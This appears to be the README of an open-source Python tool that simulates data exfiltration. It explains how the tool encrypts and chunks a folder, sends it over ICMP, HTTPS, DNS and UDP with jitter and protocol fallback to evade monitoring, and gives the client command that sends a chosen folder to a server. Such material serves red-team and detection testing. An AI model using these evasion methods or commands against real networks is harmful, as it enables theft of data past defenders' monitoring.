# Exfiltration

This project simulates an **adversary exfiltrating data** past network monitoring by dynamically switching **communication protocols**.

## Features

- **Multiple Camouflage Protocols:**
  - **ICMP Tunneling** -> Best for bypassing firewall rules on open networks.
  - **HTTPS Exfiltration** -> Best for blending into encrypted web traffic.
  - **DNS-Based Data Transfer** -> Best for stealth in locked-down environments.
  - **Custom UDP Communication** -> Best for fast, lightweight data transfer.
- **Automatic Protocol Switching** when a method is blocked.
- **Exponential Jitter-Based Delays** to simulate real-world network traffic.
- **Session-Based Transmission** to ensure data integrity.
- **AES Encryption** for security before exfiltration.

## Installation

Make sure that you have python3 installed.

```bash
git clone https://github.com/truncet/py-exfil.git
cd py-exfil
pip install -r requirements.txt 
```

## Usage

For server, make sure that you have generated keys for https,

```bash
cd server
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes
python3 server.py
```

For client,

```bash
cd client
python client.py [-h] --target-ip TARGET_IP --folder FOLDER --target-domain TARGET_DOMAIN

--target-ip → Server IP address
--folder → Folder path to exfiltrate
--target-domain → Domain for DNS-based exfiltration
```

## Why These protocols were selected

1) UDP Tunneling: 

    - UDP does not require a handshake or persistent connection, allowing chunks to be transmitted efficiently with minimal overhead.
    - Each UDP chunk contains session ID, chunk ID, and total chunks, ensuring proper file reassembly on the receiving side.
    - Since UDP does not guarantee delivery, the retry mechanism resends missing chunks or falls back to another protocol when needed.
    - As UDP is frequently used for streaming, VoIP, and gaming, packet sizes are kept within typical payload limits to avoid detection.

2) HTTPS: 

    - Chunks are wrapped inside HTTPS POST requests, ensuring that the traffic appears similar to regular web browsing activity.
    - The entire file is encrypted (AES-CBC) before exfiltration, preventing the contents from being analyzed if intercepted.
    - In cases where a chunk cannot be transmitted via HTTPS, the system ensures alternative protocols are attempted after MAX_TRIES.
    - As payloads are sent inside encrypted HTTPS sessions, network inspection tools are unable to analyze their content without SSL interception.

3) DNS:
    - To remain within DNS label size limits, data is encoded and split into multiple subdomain queries.
    - The retry mechanism ensures retransmissions occur until MAX_TRIES is reached.   
    - Since DNS is commonly allowed in networks, this method provides a - covert channel that blends in with legitimate queries.

4) ICMP: 

    - Instead of sending large packets, data is divided into small ICMP payloads (ICMP_PAYLOAD_SIZE_HEX), reducing the likelihood of detection.
    - Since ICMP operates without establishing a connection, each chunk is transmitted independently, minimizing traffic anomalies.
    - If an ICMP chunk fails to reach the destination, the retry mechanism ensures alternative protocols are used after MAX_TRIES.
    - As ICMP payloads are rarely inspected, this method allows data to be transmitted discreetly, blending in with normal network activity.


## Working

When the client is run with a specified folder path, the folder is first **compressed** into an archive. This compressed file is then **encrypted using AES encryption**. Currently, a **pre-shared key** is used for AES encryption, but for added stealth, an **RSA-based key exchange** could be implemented in the future. To change the pre-shared key, the `AES_KEY = b"this_is_a_32byte_key_for_aes_123"` variable must be updated in both the **client** and the **decrypt_file.py** file on the server.

Once the compressed file is encrypted, it is **divided into smaller chunks** before transmission. This is done to avoid **raising suspicion due to large packet sizes**, which could be flagged by network monitoring tools. Additionally, **randomized delays (exponential jitter)** are introduced between chunk transmissions to **simulate natural network traffic behavior**, preventing detection by systems that analyze packet patterns. Each chunk is **Base64 encoded** and transmitted using different protocols, with **automatic fallback** in case of failures. The server listens for incoming data across **four different protocols, each on its respective port**.

If a chunk **fails to send**, it is **retried up to `MAX_TRIES` times** before switching to another protocol. This ensures **data is not lost**, while also preventing repeated failed attempts from drawing attention. **Retransmissions are handled efficiently**, as each chunk is uniquely identified using its **session ID and chunk ID**, preventing duplication.

Once a chunk arrives at the server, the reassembly process depends on **which protocol was used** to transmit it. The **session ID and chunk ID** are used to correctly reconstruct the file, ensuring that even if some chunks **arrive out of order or with delays**, they are properly placed. For **DNS and ICMP**, where **strict payload size limitations** exist, each chunk is further **divided into smaller parts** and tracked using `part_id`. 

- **ICMP:** Since `ping` is used for transmission and ICMP only supports **hexadecimal payloads**, the chunk is sent in **hex format** rather than Base64.  
- **DNS:** Data is sent within the **subdomain name**, respecting DNS limitations on **total domain length** and **characters per label**. The reassembly is managed using `part_id`.

In case of DNS, the response IP has to be configured based on the clients ip which can be done at the start of exfiltration.

All received chunks are **stored in `CHUNK_STORAGE`**, tracked by `session_id`, `chunk_id`, and `part_id`. The reconstruction process runs **every 60 seconds**, ensuring that **delayed or retransmitted chunks** are still correctly assembled under the same session ID. Since multiple exfiltration sessions can run in parallel, the server is designed to **handle multiple concurrent session IDs**, keeping them isolated to prevent data overlap or corruption.

To further enhance stealth, additional **data padding techniques** could be introduced to make packet sizes resemble common network traffic patterns. Currently, **AES encryption ensures** that the transmitted data **cannot be analyzed** if intercepted. However, future improvements could include **traffic shaping** to better disguise payloads as **legitimate HTTPS or DNS queries**. Additionally, **metadata encryption** for chunk headers (session ID, chunk ID) could be implemented to further reduce the risk of passive traffic analysis.

Once the **encrypted file is fully reconstructed** on the server, it can be **decrypted using `decrypt_file.py`**. The command for decryption is displayed after the bin file is reconstructed (every **30 seconds**). Once decrypted, the file can be **uncompressed using `tar`**, which is also indicated in the decryption command.

